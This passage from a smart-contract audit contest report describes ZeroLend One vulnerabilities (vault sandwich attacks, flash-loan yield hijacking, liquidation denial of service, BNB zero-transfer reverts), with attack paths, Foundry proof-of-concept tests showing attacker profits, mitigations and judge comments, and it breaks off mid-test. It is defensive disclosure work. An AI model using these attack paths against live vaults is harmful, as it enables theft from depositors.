DECIMAL_OFFSETS and virtual shares work [hand in hand to combat first depositor inflation attacks](https://docs.openzeppelin.com/contracts/4.x/erc4626#defending_with_a_virtual_offset), so I personally believe they are duplicates and under a single category of issues. Additionally, even if offset is zero and virtual shares is implemented, it can already make the attack non-profitable, so I would say the root cause here is the lack of implementation of a virtual share

> If the offset is greater than 0, the attacker will have to suffer losses that are orders of magnitude bigger than the amount of value that can hypothetically be stolen from the user.

# Issue M-3: Malicious actors can execute sandwich attacks during market addition with existing funds 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143 

## Found by 
0xNirix
### Summary

The immediate addition of assets from a new and re-added market with existing assets in vault's position will cause a significant financial loss for existing vault users as attackers will execute a sandwich attack to profit from the asset-share ratio changes.

### Root Cause

The vulnerability stems from the immediate update of total assets when adding or re-adding a market with existing assets in the vault's position. This occurs in the _setCap method called by acceptCap:
https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L85-L105

```solidity
        withdrawQueue.push(pool);

        if (withdrawQueue.length > MAX_QUEUE_LENGTH) revert CuratedErrorsLib.MaxQueueLengthExceeded();

        marketConfig.enabled = true;

        // Take into account assets of the new market without applying a fee.
        pool.forceUpdateReserve(asset());
        uint256 supplyAssets = pool.supplyAssets(asset(), positionId);
        _updateLastTotalAssets(lastTotalAssets + supplyAssets);
```

This immediate update to assets is also reflected in the totalAssets() function, which sums the balance of all markets in the withdraw queue
https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVault.sol#L368
```solidity
  function totalAssets() public view override returns (uint256 assets) {
    for (uint256 i; i < withdrawQueue.length; ++i) {
      assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);
    }
  }
```

The totalAssets() value is then used in share-to-asset conversions:
```solidity
 function _accruedFeeShares() internal view returns (uint256 feeShares, uint256 newTotalAssets) {
    newTotalAssets = totalAssets();
```
```solidity
    assets = _convertToAssetsWithTotals(shares, totalSupply(), newTotalAssets, MathUpgradeable.Rounding.Up);
```

This mechanism allows an attacker to observe the acceptCap transaction and execute a sandwich attack:

Deposit assets to receive X shares for Y assets before the market addition.
After the market addition increases total assets, withdraw the same X shares to receive Y + Δ assets, where Δ is determined by the new asset-to-share ratio.

### Internal pre-conditions

1. Admin needs to call acceptCap() to add a market
2. The new/ re-added market needs to have a non-zero supplyAssets value in vault's position

### External pre-conditions

_No response_

### Attack Path

1. Attacker calls deposit() just before a market with existing position for the vault is added
2. Admin calls acceptCap() to add the market with existing funds for the vault
3. Assets of the vault are immediately increased by the amount of assets in the position for the added market, as the market is added to the withdraw queue and total assets take into account assets from all markets present in the withdraw queue
4. Attacker calls withdraw() to remove their recently deposited funds
5. Attacker receives more assets than initially deposited due to the increased asset to share ratio.

### Impact

The existing vault users suffer a loss proportional to the size of the new/ re-added market's assets relative to the total vault assets before the addition. The attacker gains this difference at the expense of other users.


**Isn't it impossible to add a market with existing funds?**
A: No, it's actually possible and even anticipated in two scenarios:
Reintegrating a previously removed market with leftover funds, e.g. A market removed due to an issue, but not all funds were withdrawn.
Adding a new market that received donations to the vaults position directly via the pool contract.

The contract specifically accounts for these cases by not charging fees on these pre-existing funds, as shown by the comment in the code `// Take into account assets of the new market without applying a fee.`

**Why is this vulnerability critical?**
A: It's critical because:

- It directly risks funds belonging to existing users which were lost when a market had to be removed with leftover funds.
- Even donations loss can be considered as a loss for existing users.


### PoC

_No response_

### Mitigation

In case of adding a market with existing funds, consider gradual unlocking of assets over a period of time.



## Discussion

**nevillehuang**

request poc

**sherlock-admin4**

PoC requested from @0xNirix

Requests remaining: **13**

**0xNirix**

Thanks.
Here is the POC code and result

```solidity
pragma solidity ^0.8.0;

import './helpers/BaseVaultTest.sol';
import {CuratedErrorsLib, CuratedEventsLib, CuratedVault, PendingUint192} from '../../../../contracts/core/vaults/CuratedVault.sol';
import {CuratedVaultFactory, ICuratedVaultFactory} from '../../../../contracts/core/vaults/CuratedVaultFactory.sol';

uint256 constant TIMELOCK = 1 weeks;

contract CuratedVaultSandwichTest is BaseVaultTest {
    using MathLib for uint256;

    ICuratedVault internal vault;
    ICuratedVaultFactory internal vaultFactory;
    ICuratedVaultFactory.InitVaultParams internal defaultVaultParams;

    address attacker;
    address user;

    function setUp() public {
        _setUpBaseVault();
        _setUpVault();

        attacker = makeAddr("attacker");
        user = makeAddr("user");

        // Setup initial cap for all
        _setCap(allMarkets[0], 600 ether);
        _setCap(allMarkets[1], 600 ether);
        _setCap(allMarkets[2], 600 ether);

        // Set supply queue to use both markets
        IPool[] memory newSupplyQueue = new IPool[](2);
        newSupplyQueue[0] = allMarkets[0];
        newSupplyQueue[1] = allMarkets[1];
        vm.prank(allocator);
        vault.setSupplyQueue(newSupplyQueue);

        // Mint tokens to users
        deal(address(loanToken), user, 1000 ether);
        deal(address(loanToken), attacker, 1000 ether);

        // Approve vault to spend user's tokens
        vm.prank(user);
        loanToken.approve(address(vault), 1000 ether);
        vm.prank(attacker);
        loanToken.approve(address(vault), 1000 ether);
    }

    function _setUpVault() internal {
        // copied from Integration Vault Test
        CuratedVault instance = new CuratedVault();
        vaultFactory = ICuratedVaultFactory(new CuratedVaultFactory(address(instance)));

        // setup the default vault params
        address[] memory admins = new address[](1);
        address[] memory curators = new address[](1);
        address[] memory guardians = new address[](1);
        address[] memory allocators = new address[](1);
        admins[0] = owner;
        curators[0] = curator;
        guardians[0] = guardian;
        allocators[0] = allocator;
        defaultVaultParams = ICuratedVaultFactory.InitVaultParams({
            revokeProxy: true,
            proxyAdmin: owner,
            admins: admins,
            curators: curators,
            guardians: guardians,
            allocators: allocators,
            timelock: 1 weeks,
            asset: address(loanToken),
            name: 'Vault',
            symbol: 'VLT',
            salt: keccak256('salty')
        });

        vault = vaultFactory.createVault(defaultVaultParams);

        vm.startPrank(owner);
        vault.grantCuratorRole(curator);
        vault.grantAllocatorRole(allocator);
        vault.setFeeRecipient(feeRecipient);
        vault.setSkimRecipient(skimRecipient);
        vm.stopPrank();

        _setCap(idleMarket, type(uint184).max);

        loanToken.approve(address(vault), type(uint256).max);
        collateralToken.approve(address(vault), type(uint256).max);

        vm.startPrank(supplier);
        loanToken.approve(address(vault), type(uint256).max);
        collateralToken.approve(address(vault), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(onBehalf);
        loanToken.approve(address(vault), type(uint256).max);
        collateralToken.approve(address(vault), type(uint256).max);
        vm.stopPrank();
    }


    function _setCap(IPool pool, uint256 newCap) internal {
        // largely copied from IntegrationVaultTest.sol

        uint256 cap = vault.config(pool).cap;
        bool isEnabled = vault.config(pool).enabled;

        
        if (newCap == cap) {
            console.log("New cap is the same as current cap, returning");
            return;
        }

        PendingUint192 memory pendingCap = vault.pendingCap(pool);
       
        if (pendingCap.validAt == 0 || newCap != pendingCap.value || true) {
            vm.prank(curator);
            vault.submitCap(pool, newCap);
        }

        vm.warp(block.timestamp + vault.timelock());

        if (newCap > 0) {
            vault.acceptCap(pool);
            if (!isEnabled) {
                IPool[] memory newSupplyQueue = new IPool[](vault.supplyQueueLength() + 1);
                for (uint256 k; k < vault.supplyQueueLength(); k++) {
                    newSupplyQueue[k] = vault.supplyQueue(k);
                }
                newSupplyQueue[vault.supplyQueueLength()] = pool;
                vm.prank(allocator);
                vault.setSupplyQueue(newSupplyQueue);
            }
        }
    }

    function testSandwichAttackOnMarketReaddition() public {
       
        // Initial deposit by a user
        vm.prank(user);
        vault.deposit(800 ether, user);

         // Log state 
        console.log("Total initial assets:", vault.totalAssets()/ 1 ether, "ether");
        console.log("User shares:", vault.balanceOf(user) / 1 ether, "ether");
        console.log("User assets:", vault.convertToAssets(vault.balanceOf(user))/ 1 ether, "ether");

        // First market had to be removed due to issues.
        _setCap(allMarkets[0], 0);
        vm.startPrank(curator);
        vault.submitMarketRemoval(allMarkets[0]);
        vm.stopPrank();

        vm.warp(block.timestamp + vault.timelock() + 1);

        vm.startPrank(allocator);
        uint256[] memory withdrawQueue = new uint256[](3);
        // the index of first market is 1 in withdrawal queue as setup in basevaulttest
        withdrawQueue[0] = 0;
        withdrawQueue[1] = 2;
        withdrawQueue[2] = 3;
        vault.updateWithdrawQueue(withdrawQueue);
        vm.stopPrank();

        // Attacker deposits just before market is re-added
        vm.prank(attacker);
        uint256 attackerShares = vault.deposit(300 ether, attacker);

        console.log("Attacker initial deposit: 300 ether");
        console.log("Attacker shares received: ", attackerShares/ 1 ether, "ether");

        // Re-add the removed market back which had assets
        _setCap(allMarkets[0], 600 ether);

        // Attacker withdraws
        vm.prank(attacker);
        uint256 withdrawnAssets = vault.redeem(attackerShares, attacker, attacker);

        console.log("Attacker assets withdrawn after market readdition: ", withdrawnAssets/ 1 ether, "ether");
        console.log("Attacker profit: ", (withdrawnAssets - 300 ether) / 1 ether, "ether");

        // Check the impact on the user
        uint256 userShares= vault.balanceOf(user);
        uint256 userAssetsAfter = vault.convertToAssets(userShares);

        console.log("After attack, User assets: ", userAssetsAfter/ 1 ether, "ether");
        console.log("After attack, User loss: ", (800 ether - userAssetsAfter)/ 1 ether, "ether");

        // Log final state
        console.log("Total assets after attack:", vault.totalAssets()/ 1 ether, "ether");
    }
}
```


Log output

Logs:
  Total initial assets: 800 ether
  User shares: 800 ether
  User assets: 800 ether
  Attacker initial deposit: 300 ether
  Attacker shares received:  1199 ether
  Attacker assets withdrawn after market readdition:  659 ether
  Attacker profit:  359 ether
  After attack, User assets:  440 ether
  After attack, User loss:  359 ether
  Total assets after attack: 440 ether



Explanation:

1. Initial State:
   - A user deposits 800 ether into the vault.
   - Total assets and user's shares are both 800 ether, indicating a 1:1 ratio of assets to shares.
   - A market with supplied assets had to be removed causing socialized loss for all users.

2. Attack Preparation:
   - Just before the market with existing funds is re-added, the attacker deposits 300 ether.
   - The attacker receives 1199 shares, which is more than their deposit due to the current asset-to-share ratio.

3. Market Re-addition:
   - The previously removed market with existing funds is re-added to the vault after resolution of issue.
   - This immediately increases the total assets of the vault without minting new shares.

4. Attacker's Withdrawal:
   - The attacker quickly withdraws their 1199 shares.
   - Due to the increased total assets, these shares are now worth 659 ether.
   - The attacker profits 359 ether (659 - 300).

5. Impact on the Original User:
   - The user's 800 shares, which originally represented 800 ether, now only represent 440 ether even though no actual fund is lost as market has recovered.
   - The user has effectively lost 359 ether, which is exactly the amount the attacker gained.



# Issue M-4: Liquidation can be DOSed due to lack of liquidity on collateral asset reserve 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/198 

## Found by 
A2-security, Flashloan44, Obsidian, almurhasan, zarkk01
### Summary

Lack of liquidity on collateral asset reserves can cause disruption to liquidation. 

### Root Cause

The protocol don't have option to disable borrowing or withdrawing in a particular asset reserve for a certain extent to protect the collateral deposits. It can only [disable borrowing](https://github.com/sherlock-audit/2024-06-new-scope-bluenights004/blob/main/zerolend-one/contracts/core/pool/configuration/ReserveConfiguration.sol#L166-L167) or [freeze](https://github.com/sherlock-audit/2024-06-new-scope-bluenights004/blob/main/zerolend-one/contracts/core/pool/configuration/ReserveConfiguration.sol#L148-L149) the whole reserves but not for specific portion such as collateral deposits. This can be a big problem because someone can always deduct or empty the reserves either by withdrawing their lended assets or borrowing loan. And when the liquidation comes, the collateral can't be paid to liquidator because the asset reserve is already not enough or emptied.

The pool administrator might suggest designating whole asset reserve to be used only for collateral deposit purposes and not for lending and borrowing. However this can be circumvented by malicious users by transferring their collateral to other reserves that accepts borrowing and lending which can eventually led the collateral to be borrowed. This is the nature of multi-asset lending protocol, it allows multiple asset reserves for borrowing and lending as per protocol documentation.

There could be another suggestion to resolve this by only using one asset reserve per pool that offers lending and borrowing but this will already contradict on what the protocol intends to be which is to be a multi-asset lending pool, meaning there are multiple assets offering lending in single pool.

If the protocol intends to do proper multi-asset lending pool platform, it should protect the collateral assets regarding liquidity issues. 

### Internal pre-conditions

1. Pool creator should setup the pool with more than 2 asset reserves offering lending or borrowing and each of reserves accepts collateral deposits. It allows any of the asset reserves to conduct borrowing to any other asset reserves and vice versa. This is pretty much the purpose and design of the multi-asset lending protocol as per documentation.


### External pre-conditions

_No response_

### Attack Path

This can be considered as attack path or can happen also as normal scenario due to the nature or design of the multi-asset lending protocol. Take note the step 6 can be just a normal happening or deliberate attack to disrupt the liquidation.

<img width="579" alt="image" src="https://github.com/user-attachments/assets/3a33a2b1-1e9d-4cc5-8463-8b4a4fcc5f46">



### Impact
This should be high risk since in a typical normal scenario, this vulnerability can happen without so much effort.
The protocol also suffers from bad debt as the loan can't be liquidated.

### PoC

1. Modify this test file /zerolend-one/test/forge/core/pool/PoolLiquidationTests.t.sol
and insert the following:
a. in line 16, put address carl = address(3); // add carl as borrower
b.  modify this function _generateLiquidationCondition() internal {
    _mintAndApprove(alice, tokenA, mintAmountA, address(pool)); // alice 1000 tokenA
    _mintAndApprove(bob, tokenB, mintAmountB, address(pool)); // bob 2000 tokenB
    _mintAndApprove(carl, tokenB, mintAmountB, address(pool)); // carl 2000 tokenB >>> add this line 


    vm.startPrank(alice);
    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0); // 550 tokenA alice supply
    vm.stopPrank();

    vm.startPrank(bob);
    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0); // 750 tokenB bob supply
    vm.stopPrank();

    vm.startPrank(carl);
    pool.supplySimple(address(tokenB), carl, supplyAmountB, 0); // 750 tokenB carl supply >>> add this portion
    vm.stopPrank();

    vm.startPrank(alice);
    pool.borrowSimple(address(tokenB), alice, borrowAmountB, 0); // 100 tokenB alice borrow
    vm.stopPrank();

    assertEq(tokenB.balanceOf(alice), borrowAmountB);

    oracleA.updateAnswer(5e3);
  }
  c. Insert this test
  function testLiquidationSimple2() external {
    _generateLiquidationCondition();
    (, uint256 totalDebtBase,,,,) = pool.getUserAccountData(alice, 0);

    vm.startPrank(carl);
    pool.borrowSimple(address(tokenA), carl, borrowAmountB, 0); // 100 tokenA carl borrow to deduct the reserves in which the collateral is deposited
    vm.stopPrank();

    vm.startPrank(bob);
    vm.expectRevert();
    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10 ether); // Bob tries to liquidate Alice but will revert

    vm.stopPrank();

    (, uint256 totalDebtBaseNew,,,,) = pool.getUserAccountData(alice, 0);

    // Ensure that no liquidation happened and Alice's debt remains the same
    assertEq(totalDebtBase, totalDebtBaseNew, "Debt should remain the same after failed liquidation");

  }
  2. Run the test forge test -vvvv --match-contract PoolLiquidationTest --match-test testLiquidationSimple2

### Mitigation

Each asset reserve should be modified to not allow borrowing or withdrawing for certain collateral deposits. For example, if a particular asset reserve has deposits for collateral, these deposits should not be allowed to be borrowed or withdrew. The rest of the balance of asset reserves will do the lending. At the current design, the pool admin can only make the whole reserve as not enabled for borrowing but not for specific account or amount.



## Discussion

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**Honour** commented:
>  see #147



# Issue M-5: An attacker can hijack the `CuratedVault`'s matured yield 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/199 

## Found by 
0xAlix2, 0xc0ffEE, A2-security, JCN, Minato7namikazi, Obsidian, TessKimy, Varun\_05, dhank, ether\_sky, iamnmt, trachev, zarkk01
### Summary

`CuratedVault#totalAssets` does not update pool's `liquidityIndex` at the beginning will cause the matured yield to be distributed to users that do not supply to the vault before the yield accrues. An attacker can exploit this to hijack the `CuratedVault`'s matured yield.

### Root Cause

`CuratedVault#totalAssets` does not update pool's `liquidityIndex` at the beginning

https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/vaults/CuratedVault.sol#L368-L372

```solidity
  function totalAssets() public view override returns (uint256 assets) {
    for (uint256 i; i < withdrawQueue.length; ++i) {
      assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);
    }
  }
```

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

Let's have:
- A vault has a total assets of `totalAssets`
- `X` amount of yield is accrued from `T1` to `T2`

1. The attacker takes a flash loan of `flashLoanAmount`
2. The attacker deposits `flashLoanAmount` at `T2` to the vault. Since `CuratedVault#totalAssets` does not update pool's `liquidityIndex`, the minted shares are calculated based on the total assets at `T1`.
3. The attacker redeems all the shares and benefits from `X` amount of yield.
4. The attacker repays the flash loan.

The cost of this attack is gas fee and flash loan fee.

### Impact

The attacker hijacks `flashLoanAmount / (flashLoanAmount + totalAssets)` percentage of `X` amount of yield.

`X` could be a considerable amount when:
- The pool has high interest rate.
- `T2 - T1` is large. This is the case for the pool with low interactions.

When `X` is a considerable amount, the amount of hijacked funds could be greater than the cost of the attack, then the attacker will benefit from the attack.

### PoC

Due to a bug in `PositionBalanceConfiguration#getSupplyBalance` that we submitted in a different issue, fix the `getSupplyBalance` function before running the PoC

`core/pool/configuration/PositionBalanceConfiguration.sol`

```diff
library PositionBalanceConfiguration {
  function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {
-   uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);
-   return self.supplyShares + increase;
+   return self.supplyShares.rayMul(index);
  }
}
```

Run command: `forge test --match-path test/PoC/PoC.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from 'lib/forge-std/src/Test.sol';
import '../forge/core/vaults/helpers/IntegrationVaultTest.sol';

contract ERC4626Test is IntegrationVaultTest {
  address attacker = makeAddr('attacker');

  function setUp() public {
    _setUpVault();
    _setCap(allMarkets[0], CAP);
    _sortSupplyQueueIdleLast();

    oracleB.updateRoundTimestamp();
    oracle.updateRoundTimestamp();

    uint256 vaultAssets = 10 ether;

    loanToken.mint(supplier, vaultAssets);
    vm.prank(supplier);
    vault.deposit(vaultAssets, supplier);
    
    vm.prank(attacker);
    loanToken.approve(address(vault), type(uint256).max);
  }

  function testDeposit() public {
    collateralToken.mint(borrower, type(uint128).max);

    vm.startPrank(borrower);
    allMarkets[0].supplySimple(address(collateralToken), borrower, type(uint128).max, 0);
    allMarkets[0].borrowSimple(address(loanToken), borrower, 8 ether, 0);

    skip(100 days);

    oracleB.updateRoundTimestamp();
    oracle.updateRoundTimestamp();

    uint256 vaultAssetsBefore = vault.totalAssets();

    console.log("Vault's assets before updating reserve: %e", vaultAssetsBefore);

    uint256 snapshot = vm.snapshot();

    allMarkets[0].forceUpdateReserve(address(loanToken));
    console.log("Vault's accrued yield: %e", vault.totalAssets() - vaultAssetsBefore);

    vm.revertTo(snapshot);

    uint256 flashLoanAmount = 100 ether;

    loanToken.mint(attacker, flashLoanAmount);

    vm.startPrank(attacker);
    uint256 shares = vault.deposit(flashLoanAmount, attacker);
    vault.redeem(shares, attacker, attacker);
    vm.stopPrank();

    console.log("Attacker's profit: %e", loanToken.balanceOf(attacker) - flashLoanAmount);
  }
}
```

Logs:

```bash
  Vault's assets before updating reserve: 1e19
  Vault's accrued yield: 5.62832773326440941e17
  Attacker's profit: 5.11666157569491763e17
```

Although the yield accrued, the vault's assets before updating reserve is still `1e19`.

### Mitigation

Update pool's `liquidityIndex` at the beginning of `CuratedVault#totalAssets` 

```diff
  function totalAssets() public view override returns (uint256 assets) {
    for (uint256 i; i < withdrawQueue.length; ++i) {
+     withdrawQueue[i].forceUpdateReserve(asset());
      assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);
    }
  }
```

# Issue M-6: Borrowers can make their position unprofitable to liquidated by using too many collateral tokens. 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/231 

## Found by 
joshuajee
### Summary

The maximum number of reserve tokens that a pool can have is 128 (This to prevent out of gas error). 
During liquidation all 128 assets are looped through adding to the total gas usage, 
a malicious user can exploit this by providing collateral worth 500 USD in the 128 reserve tokens, so they supply collateral of about 3.9 USD in each.
after that, they borrow about 400 of the tokens they want.

### Root Cause


The root cause of this bug lies in the fact that users can supply any amount of collateral even 1 wei and still take loans with it.
The more the numbers of collaterals they have in their basket the more the gas usage during liquidation. 

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/GenericLogic.sol#L82

```js

  function calculateUserAccountData(
    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage _balances,
    mapping(address => DataTypes.ReserveData) storage reservesData,
    mapping(uint256 => address) storage reservesList,
    DataTypes.CalculateUserAccountDataParams memory params
  ) internal view returns (uint256, uint256, uint256, uint256, uint256, bool) {

    //@query what happens when i supply and withdraw
    if (params.userConfig.isEmpty()) {
      return (0, 0, 0, 0, type(uint256).max, false);
    }

    CalculateUserAccountDataVars memory vars;
    uint256 reservesCount = IPool(params.pool).getReservesCount();
@-> while (vars.i < reservesCount) {
      if (!params.userConfig.isUsingAsCollateralOrBorrowing(vars.i)) {
        unchecked {
          ++vars.i;
        }
        continue;
      }
    ..
```

For example 
ETH = 2271 USD
if they borrow with the whole 128 assets as collateral the gas used during liquidation will be  1,005,205 that's about 2.28 USD in gas cost.
Given that the collateral for the single asset that the liquidator wants to liquidate is 3.9 USD, the liquidation is not really worth it as the liquidation bonus cannot cover the gas cost.

The total cost of liquidating the whole position is (1,005,205 * 128 / 2) = 64,333,120 i.e 147 USD


### Internal pre-conditions

A pool with 128 reserve tokens

### External pre-conditions

_No response_

### Attack Path

Assuming that the average LTV is 0.8

1. Attacker supplies 3.9 USD to all 128 reserves which is about 500 USD
2. Attacker borrows 400 USD.
3. Heath factor falls below 1.
4. The gas cost of liquidating just one collateral is 2.28 USD and the gain is (3.9 * 1.05 - 3.9) = 0.195 USD
5. Because the gas cost in liquidating the position is far greater than the liquidation bonus they will not liquidate the position.


### Impact

1. The position will not be liquidated on time. 
2. Many positions will go insolvent without liquidators to close them.
3. Liquidity providers will lose money.

### PoC


Add the following test to the `forge/core/pool` folder and run the test.

This is the output.

Gas Used : 1005198
HF before : 916085486657142857 35000000000
HF After  : 916743203363504031 34700037495

We can see the current gas cost is 1005198.


```js
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

import './PoolSetup.sol';

import {ReserveConfiguration} from './../../../../contracts/core/pool/configuration/ReserveConfiguration.sol';

import {UserConfiguration} from './../../../../contracts/core/pool/configuration/UserConfiguration.sol';

contract LiquidationGGPOC is PoolSetup {
  using UserConfiguration for DataTypes.UserConfigurationMap;
  using ReserveConfiguration for DataTypes.ReserveConfigurationMap;


  MintableERC20[] tokens;
  MockV3Aggregator[] oracles;

  uint reserveCount = 128;

  address alice = makeAddr("alice");
  address bob = makeAddr("bob");
  uint256 mintAmount =  50000 ether;
  uint256 mintAmountB = 50000 ether;
  uint256 supplyAmountA = 500 ether;
  uint256 supplyAmountB = 750 ether;
  uint256 borrowAmountB = 350 ether;

  function setUp() public {
    poolImplementation = new Pool();

    poolFactory = new PoolFactory(address(poolImplementation));
    configurator = new PoolConfigurator(address(poolFactory));

    poolFactory.setConfigurator(address(configurator));

    for (uint i = 0; i < reserveCount - 1; i++) {
        tokens.push(new MintableERC20('TOKEN A', 'TOKENA'));
        oracles.push(new MockV3Aggregator(8, 1e8));
    }

    tokens.push(new MintableERC20('WETH9', 'WETH9'));
    oracles.push(new MockV3Aggregator(6, 3000 * 1e8));

    irStrategy = new DefaultReserveInterestRateStrategy(47 * 1e25, 0, 7 * 1e25, 30 * 1e25);

    vm.label(address(poolFactory), 'PoolFactory');
    vm.label(address(irStrategy), 'irStrategy');
    vm.label(address(configurator), 'configurator');

    poolFactory.createPool(_poolInitParams());
    IPool poolAddr = poolFactory.pools(0);
    pool = IPool(address(poolAddr));

    pos = keccak256(abi.encodePacked(alice, 'index', uint256(0)));
  }

  function testLiquidationSimple() external {

    _mintAndApprove(alice, tokens[reserveCount - 1], mintAmount, address(pool));

    //Token index 0 is the collateral
    //Token index 1 is the borrowed token
    for (uint i = 0; i < reserveCount - 1; i++) {
        //Don't mint the borrowed token for alice
        _mintAndApprove(alice, tokens[i], mintAmount, address(pool));
        vm.prank(alice);
        pool.supplySimple(address(tokens[i]), alice, (supplyAmountA / (reserveCount - 1)), 0);
        //console.log("S: ", supplyAmountA / (reserveCount - 1));
    }

    //Mint the borrowed token for bob
    _mintAndApprove(bob, tokens[1], mintAmount, address(pool));
    vm.prank(bob);
    pool.supplySimple(address(tokens[1]), bob, supplyAmountB, 0); // 750 tokenB bob supply

    vm.startPrank(alice);

    pool.supplySimple(address(tokens[reserveCount - 1]), alice, 1, 0); // send 1 weth tokenA alice supply
    pool.borrowSimple(address(tokens[1]), alice, borrowAmountB, 0); // 100 tokenB alice borrow
    vm.stopPrank();

    for (uint i = 0; i < reserveCount - 1; i++) {
        if (i == 1) continue;
        oracles[i].updateAnswer(8e7);
    }

    (,uint debtBefore,,,,uint healthFactorBefore) = pool.getUserAccountData(alice, 0);

    uint initialGas = gasleft();
    vm.prank(bob);
    pool.liquidateSimple(address(tokens[0]), address(tokens[1]), pos, 200 ether);
    console.log("Gas Used :", initialGas - gasleft());


    (,uint debtAfer,,,, uint healthFactorAfter) = pool.getUserAccountData(alice, 0);

    console.log("HF before :", healthFactorBefore, debtBefore);
    console.log("HF After  :", healthFactorAfter, debtAfer);

  }

function _poolInitParams() internal view returns (DataTypes.InitPoolParams memory p) {

    (
    address[] memory assets, 
    address[] memory rateStrategyAddresses, 
    address[] memory sources, 
    DataTypes.InitReserveConfig[] memory configurationLocal 
    ) = _generateAddresses();

    address[] memory admins = new address[](1);
    admins[0] = address(this);

    p = DataTypes.InitPoolParams({
      proxyAdmin: address(this),
      revokeProxy: false,
      admins: admins,
      emergencyAdmins: new address[](0),
      riskAdmins: new address[](0),
      hook: address(0),
      assets: assets,
      rateStrategyAddresses: rateStrategyAddresses,
      sources: sources,
      configurations: configurationLocal
    });
  }


  function _generateAddresses()
    internal view returns (address[] memory, address[] memory, address[] memory, DataTypes.InitReserveConfig[] memory) {
    address[] memory assets = new address[](reserveCount);
    address[] memory rateStrategyAddresses = new address[](reserveCount);
    address[] memory sources = new address[](reserveCount);
    DataTypes.InitReserveConfig memory config = _basicConfig();
    DataTypes.InitReserveConfig[] memory configurationLocal = new DataTypes.InitReserveConfig[](reserveCount);
    for (uint i = 0; i < reserveCount; i++) {
        assets[i] = address(tokens[i]);
        rateStrategyAddresses[i] = address(irStrategy);
        sources[i] = address(oracles[i]);
        configurationLocal[i] = config;
    }
    return (assets, rateStrategyAddresses, sources, configurationLocal);
  }

}
```

### Mitigation

1. Enforce a minimum supply amount for an asset to be used as collateral.
2. Limit the total number of active collateral for a position to 10 tokens.




## Discussion

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**Honour** commented:
>  It's not practical for a pool to have that many tokens. Deploying such a pool itself would be gas intensive for the owner (especially on mainet). Also the 128 limit is not neccessarily to prevent out of gas errors but because collateral/debt info is stored in a 256-bit word for gas efficiency



**nevillehuang**

This is a very interesting finding, will leave open for escalation discussion, especially when pool creation is permisionless so is subject to various configuration

# Issue M-7: When the collateral token is BNB, full liquidations will revert due to sending 0 amount 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/279 

## Found by 
Obsidian
### Summary

BNB has a check in it's `transfer()` function to revert for 0 amounts

The issue is that during complete liquidations (taking all the collateral), the following [[code](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L178-L189)](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L178-L189) will send a 0 amount, which will revert the whole liquidation call

```solidity
// Transfer fee to treasury if it is non-zero
    if (vars.liquidationProtocolFeeAmount != 0) {
      uint256 liquidityIndex = collateralReserve.getNormalizedIncome();
      uint256 scaledDownLiquidationProtocolFee = vars.liquidationProtocolFeeAmount.rayDiv(liquidityIndex);
      uint256 scaledDownUserBalance = balances[params.collateralAsset][params.position].supplyShares;

      if (scaledDownLiquidationProtocolFee > scaledDownUserBalance) {
        vars.liquidationProtocolFeeAmount = scaledDownUserBalance.rayMul(liquidityIndex);
      }

      IERC20(params.collateralAsset).safeTransfer(IPool(params.pool).factory().treasury(), vars.liquidationProtocolFeeAmount);
    }

```

Even if the `vars.liquidationProtocolFeeAmount != 0`

since `scaledDownUserBalance == 0` (user has 0 collateral since the liquidator took all of it)

It will update `vars.liquidationProtocolFeeAmount == scaledDownUserBalance.rayMul(liquidityIndex)`, which is 0

Therefore trying to transfer the 0 amount will revert

### Root Cause

During a full liquidation, it will attempt to transfer a 0 amount [here](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L178-L189), which will revert the whole liquidation call

### Internal pre-conditions

Collateral token of user is BNB

### External pre-conditions

Liquidator attempts to take all the collateral

### Attack Path

_No response_

### Impact

Liquidation reverts, increasing the risk of accumulating bad debt

### PoC

_No response_

### Mitigation

Implement the 0 amount check right before the transfer to prevent this issue



## Discussion

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**Honour** commented:
>  Invalid: `scaledDownUserBalance` cannot be 0 if vars.liquidationProtocolFeeAmount != 0 because the liquidationProtocolFeeAmount is included in the `_calculateAvailableCollateralToLiquidate()` function



**nevillehuang**

request poc

BNB behavior of reverting zero transfers is true, however unsure if issue is correct, need to see a PoC

**sherlock-admin4**

PoC requested from @ObsidianAudits

Requests remaining: **12**

**ObsidianAudits**

Hi @nevillehuang 

Here is the PoC:
```solidity
function testJ_fullLiquidation() external {
        _generateLiquidationCondition();
        poolFactory.setLiquidationProtcolFeePercentage(1e2); // Set a 1% protocol fee

        vm.startPrank(bob);
